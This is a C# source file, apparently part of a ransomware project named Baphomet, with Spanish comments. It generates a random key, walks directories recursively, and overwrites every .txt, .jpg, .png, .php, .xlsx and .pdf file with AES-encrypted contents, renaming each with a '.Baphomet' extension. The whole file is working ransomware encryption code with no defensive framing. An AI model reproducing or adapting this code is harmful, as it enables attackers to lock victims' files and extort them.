using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;

namespace Baphomet.Utilities
{
    public class Cryptep
    {
        //Genero un password aleatorio.
        public string GenerateKey()
        {
            int length = 15;
            var validated = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/";
            StringBuilder res = new StringBuilder();
            Random rnd = new Random();
            while (0 < length--)
            {
                res.Append(validated[rnd.Next(validated.Length)]);
            }
            return res.ToString();
        }

        //recorro los directorios a cifrar.
        public void directoryRoad(string target_path, string key)
        {
            CryptRSA cryptRSA = new CryptRSA();

            var extensionCheck = new[] { ".txt", ".jpg", ".png",".php" , ".xlsx", ".pdf" };//Extensiones validas para cifrar
            cryptRSA.EncryptText(target_path, key);

           // File.WriteAllText(targetPath + "\\yourkey.key", encryptedKey);//escribo la llave en cada uno de los directorios

            string[] files = Directory.GetFiles(target_path); //obtengo todos los archivos del directorio en el que me encuentro.
            string[] sub_dirs = Directory.GetDirectories(target_path);//obtengo los subdirectorios del directorio en el que me encuentro.
            try
            {
                for (int i = 0; i < files.Length; i++)
                {
                    var extension = Path.GetExtension(files[i]);
                    if (extensionCheck.Contains(extension))
                    {
                        encryptFileData(files[i], key);
                    }
                }

                for (int i = 0; i < sub_dirs.Length; i++)
                {
                    directoryRoad(sub_dirs[i], key);
                }
            }
            catch(Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }

         //archivo valido para cifrar bytes
        static void encryptFileData(string file, string key)
        {
            byte[] encryptFileBites = File.ReadAllBytes(file);
            byte[] passwordBytes = Encoding.UTF8.GetBytes(key);
            passwordBytes = SHA256.Create().ComputeHash(passwordBytes);

            var encryptedBytes = UseAES(encryptFileBites, passwordBytes);
            File.WriteAllBytes(file, encryptedBytes);
            File.Move(file, file + ".Baphomet");

        }

        //Cifro los bytes de el archivo
        static byte[] UseAES(byte[] fileBytes, byte[] passw)
        {
            byte[] encryptedBytes = null;
            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };

            using (MemoryStream ms = new MemoryStream())
            {
                using (SymmetricAlgorithm aes = new AesManaged())
                {
                    aes.KeySize = 256;
                    aes.BlockSize = 128;

                    var key = new Rfc2898DeriveBytes(passw, saltBytes, 1000);

                   aes.Key = key.GetBytes(aes.KeySize / 8);
                   aes.IV = key.GetBytes(aes.BlockSize / 8);
                   aes.Mode = CipherMode.CBC;

                    using (var cryptStream = new CryptoStream(ms, aes.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cryptStream.Write(fileBytes, 0, fileBytes.Length);
                        cryptStream.Close();
                    }
                    encryptedBytes = ms.ToArray();
                }
                return encryptedBytes;
            }
        }
       
    }
}
